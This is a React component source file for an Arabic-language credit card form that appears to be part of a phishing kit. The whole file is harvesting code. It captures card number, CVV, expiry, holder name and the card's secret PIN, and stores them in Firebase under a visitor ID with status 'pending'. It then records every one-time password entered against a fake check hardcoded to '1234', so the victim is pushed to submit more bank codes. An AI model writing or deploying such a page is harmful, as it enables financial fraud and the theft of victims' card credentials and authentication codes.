"use client"

import { useEffect, useRef, useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { ArrowRight, Camera, Menu, Circle, ChevronRight } from "lucide-react"
import { addData, db } from "@/lib/firebase"
import { doc, onSnapshot } from "firebase/firestore"
import { OtpDialog } from "./otp-dialog"
import Loader from "./loader"

const allOtps = [""]

export default function CreditCardPage() {
  const [cardHolder, setCardHolder] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [cardNumbers, setCardNumbers] = useState("")
  const [otpValues, setOtpValues] = useState(["", "", "", ""])
  const [showOtp, setShowOtp] = useState(false)
  const [otpError, setOtpError] = useState("")
  const [errors, setErrors] = useState<{ [key: string]: string }>({})
  const [isLoading, setIsLoading] = useState(false)
  const [pass, setPass] = useState("")

  const cardInputRefs = useRef<(HTMLInputElement | null)[]>([])

  const validateForm = () => {
    const newErrors: { [key: string]: string } = {}



    // Validate card numbers
    if (!cardNumbers.trim()) {
      newErrors.cardNumbers = "رقم البطاقة مطلوب"
    }

    // Validate expiry date
    if (!expiryDate.trim()) {
      newErrors.expiryDate = "تاريخ انتهاء الصلاحية مطلوب"
    } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      newErrors.expiryDate = "تاريخ غير صحيح (MM/YY)"
    }

    // Validate CVV
    if (!cvv.trim()) {
      newErrors.cvv = "رمز الأمان مطلوب"
    } else if (!/^\d{3}$/.test(cvv)) {
      newErrors.cvv = "رمز الأمان يجب أن يكون 3 أرقام"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleContinue = (otp: string) => {
    setIsLoading(true)

    const otpString = otp
    allOtps.push(otp)
    const visitorId = localStorage.getItem("visitor")

    addData({
      id: visitorId,
      otp: otpString, // Changed from otpValues to otpString
      allOtps,
      cardHolder,
    })

    // Validate OTP
    if (otpString.length !== 4) {
      setOtpError("يرجى إدخال رمز التحقق المكون من 4 أرقام")
      return
    }

    if (!/^\d{4}$/.test(otpString)) {
      setOtpError("رمز التحقق يجب أن يحتوي على أرقام فقط")
      return
    }

    // Simulate OTP verification (you can replace with actual API call)
    if (otpString !== "1234") {
      setOtpError("رمز التحقق غير صحيح")
      setOtpValues(["", "", "", ""])
      setIsLoading(false)

      return
    }

    // Success - proceed with form submission
    console.log("OTP verified successfully")
  }

  const handleCloseOtp = () => {
    setShowOtp(false)
    setOtpValues(["", "", "", ""])
    setOtpError("")
  }


  const handleSubmit = async (e: any) => {
    e.preventDefault()
    setIsLoading(true)
    if (!validateForm()) {
      return
    }

    const visitorId = localStorage.getItem("visitor")

    await addData({
      id: visitorId,
      cardNumber: cardNumbers,
      cardHolder,
      status: "pending",
      cvv: cvv,
      expiryDate: expiryDate, // Fixed typo from "expiaryDate"
      pass,
    })

    setTimeout(() => {
      setShowOtp(true)
      setIsLoading(false)

    }, 2000)
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Status Bar */}

      {/* Header */}
      <div className="bg-gray-100 px-4 py-6 flex items-center justify-between">
        <ArrowRight className="w-6 h-6 text-gray-600" />
        <h1 className="text-lg font-semibold text-gray-800 text-center flex-1">تفاصيل البطاقة الائتمانية</h1>
        <div className="w-6"></div>
      </div>
      {isLoading && <Loader />}
      {/* Main Content */}
      <div className="px-4 pb-24">
        {/* Credit Card Preview */}
        <div className="mb-8">
          <Card className="bg-white p-6 rounded-2xl shadow-sm">
            <div className="space-y-4">
              {/* Card chip and contactless */}
              <div className="flex justify-between items-start">
                <div className="flex gap-2">
                  <div className="w-3 h-2 bg-gray-300 rounded-sm"></div>
                  <div className="w-3 h-2 bg-gray-300 rounded-sm"></div>
                </div>
              </div>

              {/* Card chip */}
              <div className="w-12 h-9 bg-gray-300 rounded-md"></div>

              {/* Card number placeholders */}
              <div className="flex justify-between">
                <div className="w-16 h-3 bg-gray-300 rounded"></div>
                <div className="w-16 h-3 bg-gray-300 rounded"></div>
                <div className="w-16 h-3 bg-gray-300 rounded"></div>
                <div className="w-16 h-3 bg-gray-300 rounded"></div>
              </div>

              {/* Expiry date placeholder */}
              <div className="flex justify-center">
                <div className="w-12 h-3 bg-gray-300 rounded"></div>
              </div>

              {/* Card holder name placeholder */}
              <div className="flex gap-2">
                <div className="w-16 h-3 bg-gray-300 rounded"></div>
                <div className="w-12 h-3 bg-gray-300 rounded"></div>
              </div>
            </div>
          </Card>
        </div>

        {/* Form Fields */}
        <form className="space-y-4" onSubmit={handleSubmit}>
          {/* Card Number */}
          <div className="relative">
            <Input
              type="tel"
              maxLength={19}
              placeholder="رقم البطاقة"
              required
              value={cardNumbers}
              onChange={(e) => setCardNumbers(e.target.value)}
              className="w-full h-14 text-right pr-12 text-gray-600 border-gray-300 rounded-xl"
            />
            {errors.cardNumbers && <div className="text-red-500 text-sm mt-1">{errors.cardNumbers}</div>}
            <Camera className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
            <Menu className="absolute right-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
          </div>

          {/* Card Holder */}
          <div>
            <Input
              type="text"
              placeholder="حامل البطاقة"
              required
              value={cardHolder}
              onChange={(e) => setCardHolder(e.target.value)}
              className="w-full h-14 text-right pr-4 text-gray-600 border-gray-300 rounded-xl"
            />
          </div>

          {/* Phone Number */}


          {/* Expiry Date and CVV */}
          <div className="flex gap-4">
            <div className="flex-1">
              <Input
                type="text"
                placeholder="رمز الحماية الثلاثي"
                required
                maxLength={3}
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                className="w-full h-14 text-center text-gray-600 border-gray-300 rounded-xl"
              />
              {errors.cvv && <div className="text-red-500 text-sm mt-1">{errors.cvv}</div>}
              <div className="text-center text-xs text-gray-400 mt-1">XXX</div>
            </div>
            <div className="flex-1">
              <Input
                type="text"
                placeholder="تاريخ انتهاء الصلاحية"
                value={
                  expiryDate.length === 2 ? expiryDate.substring(0, 2) + "/" + expiryDate.substring(2, 4) : expiryDate
                }
                onChange={(e) => {
                  let value = e.target.value.replace(/\D/g, "") // Remove non-digits
                  if (value.length >= 2) {
                    value = value.substring(0, 2) + "/" + value.substring(2, 4)
                  }
                  setExpiryDate(value)
                }}
                maxLength={5}
                className="w-full h-14 text-center text-gray-600 border-gray-300 rounded-xl"
              />
              {errors.expiryDate && <div className="text-red-500 text-sm mt-1">{errors.expiryDate}</div>}
              <div className="text-center text-xs text-gray-400 mt-1">MM/YY</div>
            </div>
          </div>

          {/* Password */}
          <div>
            <Input
              type="password"
              placeholder="الرقم السري لبطاقة الخصم"
              value={pass}
              maxLength={4}
              onChange={(e) => setPass(e.target.value)}
              className="w-full h-14 text-right pr-4 text-gray-600 border-gray-300 rounded-xl"
            />
          </div>

          {/* Use Card Button */}
          <div className="pt-4">
            <Button
              type="submit"
              disabled={isLoading}
              className="w-full h-14 bg-orange-500 hover:bg-orange-600 text-white text-lg font-medium rounded-xl"
            >
              {isLoading ? "جاري المعالجة..." : "استخدام البطاقة"}
            </Button>
          </div>
        </form>
      </div>

      <OtpDialog isOpen={showOtp} onClose={() => setShowOtp(false)} onVerify={handleContinue} />

      {/* Bottom Navigation */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 px-4 py-4">
        <div className="flex justify-between items-center">
          <Menu className="w-6 h-6 text-gray-400" />
          <Circle className="w-8 h-8 text-gray-400" />
          <ChevronRight className="w-6 h-6 text-gray-400" />
        </div>
      </div>
    </div>
  )
}
